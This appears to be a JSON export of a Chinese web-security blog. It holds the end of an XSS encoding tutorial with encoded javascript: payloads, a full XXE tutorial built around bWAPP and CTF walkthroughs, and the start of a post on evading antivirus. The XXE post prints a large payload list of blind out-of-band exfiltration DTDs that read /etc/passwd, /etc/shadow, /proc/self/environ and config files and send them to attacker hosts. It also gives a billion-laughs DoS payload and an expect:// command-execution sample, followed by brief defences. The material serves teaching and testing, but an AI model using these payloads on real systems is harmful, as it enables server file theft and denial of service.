Unicode转义序列（如\\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’\\’符号前置在Unicode转义序列串（如\\u000A000B000C）并不能作为标识符名称中的字符。将Unicode转义序列串放在标识符名称中是非法的。#### 3、控制字符当用 Unicode 转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果你去看 ECMAScript 的语法，就会发现没有一处会用Unicode 转义序列来当作控制字符。例如，如果解析器正在解析一个函数调用语句，圆括号部分必须为`(`和`)`，而不能是`\\u0028`和`\\u0029`。总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。### Example#### Example 1 &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt; 123这段代码可以被执行，首先经过 HTML 解析器，把 HTML 实体部分解析了，变成 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt; 123此时，由于 javascript 已经生成，不违反 URL 解析规则。所以，URL 解析正常。解析了 javascript ，最终进入 JS解析器。注意，URL 解析器还完成了 URL 解码工作。 &lt;a href=&quot;javascript:alert(2)&quot;&gt;test&lt;/a&gt; 12345所以可以成功执行代码弹窗。#### Example 2 &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 12345其中 URL 编码的是`javascript:alert(1)`，其实这段代码放到 html 当中并不会执行，URL解码之后 Javascript 解析器完成解码操作，讲道理脚本应该会正常执行啊，这里就有一个 URL 解析过程中的一个细节了，**不能对协议类型进行任何的编码操作**，否则 URL 解析器会认为它无类型，就导致这里被编码的`javascript`没有解码，当然不会被 URL 解析器识别了。#### Example 3 &lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&quot;&gt;test3&lt;/a&gt; 12345以上为对`[test3](javascript:alert(3))`先做 JS 编码，然后做URL编码，再做HTML编码共3层。所以这里符合编码其实在首先经过 HTML 解析器解析之后变成 &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;test3&lt;/a&gt; 123再经过 URL 解析器解析到了`javascript`，并解析后面的 url 编码变成 &lt;a href=&quot;javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(3)&quot;&gt;test3&lt;/a&gt; 12345URL 解析器传给 JS 解析器解析 javascript 代码，正常解析得到弹窗#### Example 4 &lt;a onclick=&quot;window.open('value1')&quot; href=&quot;javascript:window.open('value2')&quot;&gt;&lt;/a&gt; 1234567`value1`处，先经过 HTML 解码，然后经过 javascript 解码，最后经过 url 解码`value2`处则是先经过 HTML 解码，然后经过 url 解码，接着 javascript 解码，最后经过 url 解码#### Example 5 &lt;img src&amp;#x3d;&quot;http://www.example.com&quot;&gt; &lt;img s&amp;#x72;c=&quot;http://www.example.com&quot;&gt; 这里都不会加载图片，因为参考我们上面讲的三种状态，这里实体编码存在的地方并不属于任何一种状态，所以并不会被解码。 Examples1、&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; URL encoded “javascript:alert(1)” Answer: The javascript will NOT execute. Explanation: URL 解析器解析之后不会再掉用 js 解析器解析，所以不会使用 js 伪协议 2、&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61 %6c%65%72%74%28%32%29&quot;&gt; Character entity encoded “javascript” and URL encoded “alert(2)” Answer: The javascript will execute. Explanation: 首先用 HTML 解析器解析实体字符，再用 URL 解析器解析，并调用 js 解析器进行 js 伪协议解析 3、&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; URL encoded “:” Answer: The javascript will NOT execute. Explanation: URL 解析器解析之后并不会识别 js 伪协议 4、&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; Character entity encoded &lt; and &gt; Answer: The javascript will NOT execute. Explanation: 参照 #数据状态中的字符引用 5、&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; Character entity encoded &lt; and &gt; Answer: The javascript will NOT execute AND the character entities will NOTbe decoded either Explanation: 参照 #RCDATA 状态中的字符引用 6、&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; Answer: The javascript will NOT execute. Explanation: 参照 #RCDATA 状态中的字符引用 7、&lt;button onclick=&quot;confirm('7&amp;#39;);&quot;&gt;Button&lt;/button&gt; Character entity encoded ‘ Answer: The javascript will execute. Explanation: 属于属性值状态中的字符引用，会在 HTML 解析器中首先被解析成'，闭合了单引号，得到执行 8、&lt;button onclick=&quot;confirm('8\\u0027);&quot;&gt;Button&lt;/button&gt; Unicode escape sequence encoded ‘ Answer: The javascript will NOT execute. Explanation: 存在字符串中，不会被解析成' 9、&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt; Character entity encoded alert(9); Answer: The javascript will NOT execute. Explanation: 由 js 解析器解析，并不会交由 HTML 解析器解析，所以不识别，不执行 10、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt; Unicode Escape sequence encoded alert Answer: The javascript will execute. Explanation: 由 js 解析器解析，属于 js 的编码，可以直接执行 11、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;Unicode Escape sequence encoded alert(11) Answer: The javascript will NOT execute. Explanation: 由 js 解析器解析，属于 js 的编码，但是编码了(、)，而这两个属于控制字符，不会被正常解析 12、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt; Unicode Escape sequence encoded alert and 12 Answer: The javascript will NOT execute. Explanation: 要么是因为\\u0031\\u0032不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。 13、&lt;script&gt;alert('13\\u0027)&lt;/script&gt; Unicode escape sequence encoded ‘ Answer: The javascript will NOT execute. Explanation: 在字符串中，被解析成字符串 14、&lt;script&gt;alert('14\\u000a')&lt;/script&gt; Unicode escape sequence encoded line feed. Answer: The javascript will execute. Explanation: \\u000a会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。 15、&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt; Answer: The javascript will execute. Explanation: 参照 Example 3 转载自：https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/#%E5%B1%9E%E6%80%A7%E5%80%BC%E7%8A%B6%E6%80%81%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E5%BC%95%E7%94%A8","link":"/2019/10/14/web%E6%B8%97%E9%80%8F/XSS%E5%AD%A6%E4%B9%A0/"},{"title":"XXE漏洞","text":"0x00 XML这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。 首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。 XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的 如下一个XML文档，它的结构可以分为XML声明、文档类型定义（DTD）、文档元素，其中DTD 是可选的，这次漏洞就是在解析DTD 时产生的。DOCTYPE是DTD的声明，ENTITY是实体的声明，SYSTEM、PUBLIC是外部资源的申请。 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; //XML 声明&lt;!DOCTYPE entity [ //文档类型定义 &lt;!ENTITY name &quot;haogang&quot;&gt;]&gt;&lt;author&gt; //文档元素 &lt;nickname&gt;&amp;name;&lt;/nickname&gt; //文档元素 &lt;age&gt;18&lt;/age&gt;&lt;/author&gt; 从两个角度可以把XML分为两类共4个类型：（内部实体、外部实体）、（通用实体、参数实体）。其中两大类含有重复的地方。 0x02 DTD文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。 带有DTD的XML文档实例1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt; - PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。 不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换 - CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 DTD元素 DTD属性 属性声明使用以下语法 1&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt; DTD实例 1&lt;!ATTLIST payment Hu3sky CDATA &quot;H&quot;&gt; XML实例 1&lt;payment Hu3sky=&quot;H&quot; /&gt; 以下是属性类型的选项 默认值参数可以使用下列值: DTD-实体(重要)实体是用于定义引用普通文本或特殊字符的快捷方式的变量。 实体引用是对实体的引用。 实体可以在内部或外部进行声明 通用实体：&amp;实体名; 引用的实体，他在DTD中定义，在XML文档中引用 参数实体： a.使用% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用%实体名; 引用 b.只有在DTD文件中，参数实体的声明才能引用其他实体 c.和通用实体一样，参数实体也可以外部引用 内部实体 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体 1&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt; 参数实体 1&lt;!ENTITY %实体名称 &quot;值&quot;&gt; or 1&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; 内部实体这里DTD（文档类型定义）的作用是定义XML文件中有哪些模块，这些模块能包含什么样的内容。常见的模块有元素，属性，实体等等。 其中一种模块是实体。实体就像编程语言中的常量，我们可以将一串普通文本定义为一个实体，这样就可以在XML 通过这个实体引用这段文本。实体有两种，直接在DTD 中声明的实体称为内部实体，通过SYSTEM 从外部引入内容的是外部实体。 这样解释比较抽象，我们先来看一个内部实体的示例，看看实体到底是什么。内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE entity [ &lt;!ENTITY name &quot;haogang&quot;&gt; //定义实体 name]&gt;&lt;author&gt; &lt;nickname&gt;&amp;name;&lt;/nickname&gt; //使用实体，&amp;实体名; &lt;age&gt;18&lt;/age&gt;&lt;/author&gt; 定义好实体后，在XML 中使用实体时，有固定的格式：以 &amp; 开头，中间是实体名，再以 ; 结尾。经过解析后，实体将会被替换成定义的内容，这里XML 会变成这样: 1234&lt;author&gt; &lt;nickname&gt;haogang&lt;/nickname&gt; //将内容替换为实体内容 &lt;age&gt;18&lt;/age&gt;&lt;/author&gt; 这就是实体，通过将一串文本定义为一个实体，就可以在XML 通过这个实体来引用这段文本。 外部实体在来看一下外部实体，这是一个外部实体的示例，外部实体的标志是使用SYSTEM 将外部文件的内容定义到实体上，然后可以在XML 中通过这个实体，引用外部文件的内容。 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE entity[ &lt;!ENTITY name SYSTEM &quot;file:///etc/password&quot;&gt;]&gt;&lt;author&gt; &lt;nickname&gt;&amp;name;&lt;/nickname&gt; &lt;age&gt;18&lt;/age&gt;&lt;/author&gt; 这里实体将会被替换成定义的内容，也就是/etc/password，正常使用中 nickname 的内容可能被返回给用户，也就会将服务器password 的内容暴露给了攻击者，导致服务器被攻击。 XXE 漏洞，正是利用了XML 外部实体可以解析外部文件的特性，才使得攻击成为可能。 参数实体+外部实体12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name;]&gt; %name(参数实体)是在DTD中被引用的，而&amp;name;是在xml文档中被引用的。 XXE主要是利用了DTD引用外部实体导致的漏洞。 0x03攻击实例读取任意文件例子1外部实体引用,有回显 这里我用bWAPP平台上的一道XXE的题目来说明 题目是这样的，我们点击这个按钮然后抓包看看 可以看到xxe-1.php页面以POST方式向xxe-2.php页面传输了XML数据，既然是XML数据，我们就可以自己增加一个恶意外部实体然后再原本的XML数据中进行实体调用，来进行XXE攻击，如下： 可以看到，成功的读取了robots.txt中的内容，这里的hu3sky是我们定义的一个外部实体。 为了更好理解原理，我们来看一看xxe-2.php的源码。 主要代码在这。 可以看到这里直接用了simplexml_load_string() ，simplexml_load_string() 函数的作用是把XML 字符串载入对象中。函数获取xml内容，并没有做任何过滤，$login获取login标签里的内容，最后拼接到$message显示在屏幕上 例子二jarvisoj上的一道题目API调用 这道题的题目说明是 请设法获得目标机器/home/ctf/flag.txt中的flag值。 进入题目 http://web.jarvisoj.com:9882/ 发现一个输入框，我们对其进行抓包发现了json数据，修改发现可以被解析 。一开始没有思路，后来看了wp，发现是要把json处改为xml。所以就知道了，这题是xxe。修改json处，构造一个xml表单进行xml注入，得到flag。 检测内网端口有回显时，直接发送payload： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE XXE [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY XXE SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;XXE;&lt;/name&gt;&lt;/root&gt; 当我们检测80端口时，80端口开放，这时会返回页面报错信息(记得url编码。因为页面会解码一次)，如下： 当我们检测3389端口，3389端口未开放，端口未开放时返回情况如下： Bind XXE如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据。 所以，在没有回显的情况下如何来利用XXE 思路： 客户端发送payload 1给web服务器 web服务器向vps获取恶意DTD，并执行文件读取payload2 web服务器带着回显结果访问VPS上特定的FTP或者HTTP 通过VPS获得回显（nc监听端口） 本地客户端(payload 1 ) 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://vps/test.xml&quot;&gt; %remote;]&gt; 由于web端会解码，所以需要我们先html实体编码一次 payload 2 也就是test.xml的内容(VPS) 1234&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM 'ftp://VPS:21/%payload;'&gt;&quot;&gt;%int;%trick; 这个是先将SYSTEM的file协议读取到的内容赋值给参数实体%payload，第二步是一个实体嵌套，trick是远程访问ftp协议所携带的内容 拓：Bind XXE实例漏洞分析首先，与大多数挖洞者的探测模式一样，我对目标网站进行了全方位的服务资产踩点识别，在此过程中，我发现了其中一个子域名网站比较有意思，于是，我就对它进行了目录遍历，然后，就发现了其名为/notifications的服务端。在BurpSuite中，对这个/notifications服务端的请求和响应如下图所示： 在其响应内容中，我注意到，除了有XML内容外，还包含了一个XML SOAP语法体。由于没有GET参数可供测试，因此我决定向该/notifications服务端发送一个简单的，不指定任何内容类型（content-type）的POST请求进行探究，之后，在POST请求发出后，XML SOAP语法体不再出现，而且整个请求响应的代码为200： 看来，貌似该Web应用端对POST请求能做出很好的响应，且不会抛出405的请求方法错误，所以我又构造定义了包含content-type: application/xml样式的XML语法内容，用它来作POST请求，看看响应如何： 虽然这次的POST响应还是XML内容，但却与上一次不同，这种响应表面上看似像服务端对GET请求的响应，而且，这次的响应内容中包含的标签值不是上次的“TestRequestCalled”，而是“OK”。接着，我又发送了一个定义的JSON请求（content-type: application/json），来测试服务端的具体响应： 这一次，响应内容又是空的，和未指定任何内容类型的简单POST请求响应一样，由此，我推断该服务端能正常处理XML数据，这样一来，我想尝试利用BLIND XXE攻击方式来触发其漏洞。我通过在自己VPS上架设了一个dtd文件，然后利用外部实体引用途径来测试其XML解析机制，幸运的是，最终部署在我VPS上的这个外部dtd文件实体被成功解析引用，以下是其请求内容和最后的解析结果： xxe-ftp-server.rb脚本应用由于该系统使用了java框架，而俄罗斯OnSec实验室曾针对Java程序的XXE-OOB攻击作出了相关研究，并给出相应的payload，以及一个通过ftp服务读取系统目录的漏洞利用脚本xxe-ftp-server.rb，运行该脚本后，8088端口作为http服务端负责获取OOB攻击payload，而8077端口用于ftp连接服务，最终能成功读取到目标系统目录： 尽管最后该漏洞被确认为一个重复报，但我还是想把它分享出来，我自己也从中学到一些判断服务端应用的经验。 一些有用的XXE Payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117--------------------------------------------------------------Vanilla, used to verify outbound xxe or blind xxe--------------------------------------------------------------&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY sp SYSTEM &quot;http://x.x.x.x:443/test.txt&quot;&gt;]&gt;&lt;r&gt;&amp;sp;&lt;/r&gt;---------------------------------------------------------------OoB extraction---------------------------------------------------------------&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://x.x.x.x:443/ev.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;## External dtd: ##&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;&quot;&gt;----------------------------------------------------------------OoB variation of above (seems to work better against .NET)----------------------------------------------------------------&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://x.x.x.x:443/ev.xml&quot;&gt;%sp;%param1;%exfil;]&gt;## External dtd: ##&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;&quot;&gt;---------------------------------------------------------------OoB extraction---------------------------------------------------------------&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY % data3 SYSTEM &quot;file:///etc/shadow&quot;&gt;&lt;!ENTITY % sp SYSTEM &quot;http://EvilHost:port/sp.dtd&quot;&gt;%sp;%param3;%exfil;]&gt;## External dtd: ##&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'&gt;&quot;&gt;-----------------------------------------------------------------------OoB extra ERROR -- Java-----------------------------------------------------------------------&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY % data3 SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % sp SYSTEM &quot;http://x.x.x.x:8080/ss5.dtd&quot;&gt;%sp;%param3;%exfil;]&gt;&lt;r&gt;&lt;/r&gt;## External dtd: ##&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#x25; external SYSTEM &quot;file:///nothere/%payload;&quot;&gt;'&gt; %param1; %external;-----------------------------------------------------------------------OoB extra nice-----------------------------------------------------------------------&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % stuff SYSTEM &quot;file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml &quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://evil/evil.xml&quot;&gt;%dtd;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt; ## External dtd: ## &lt;!ENTITY all &quot;%start;%stuff;%end;&quot;&gt;------------------------------------------------------------------File-not-found exception based extraction------------------------------------------------------------------&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % one SYSTEM &quot;http://attacker.tld/dtd-part&quot; &gt; %one; %two; %four;]&gt;## External dtd: ##&lt;!ENTITY % three SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM 'file:///%three;'&gt;&quot;&gt;-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;--------------FTP--------------&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a [&lt;!ENTITY % asd SYSTEM &quot;http://x.x.x.x:4444/ext.dtd&quot;&gt;%asd;%c;]&gt;&lt;a&gt;&amp;rrr;&lt;/a&gt;## External dtd ##&lt;!ENTITY % d SYSTEM &quot;file:///proc/self/environ&quot;&gt;&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;&quot;&gt;---------------------------Inside SOAP body---------------------------&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;---------------------------Untested - WAF Bypass---------------------------&lt;!DOCTYPE :. SYTEM &quot;http://&quot;&lt;!DOCTYPE :_-_: SYTEM &quot;http://&quot;&lt;!DOCTYPE {0xdfbf} SYSTEM &quot;http://&quot; DOS12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 命令执行php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装，所以一般来说，比较难利用，这里就只给出代码了 123456789101112&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 0x04 防御XXE使用开发语言提供的禁用外部实体的方法 PHP: 1libxml_disable_entity_loader(true); JAVA: 12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 不允许XML中含有自己定义的DTD REFERENCE：http://ironxu.com/910 https://www.freebuf.com/news/175451.html、 https://www.freebuf.com/vuls/167087.html","link":"/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/"},{"title":"免杀基础","text":"0x00 杀毒软件检测方式杀软常见扫描方式 1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。 3、修复技术：即是对恶意程序所损坏的文件进行还原 4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。 5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。 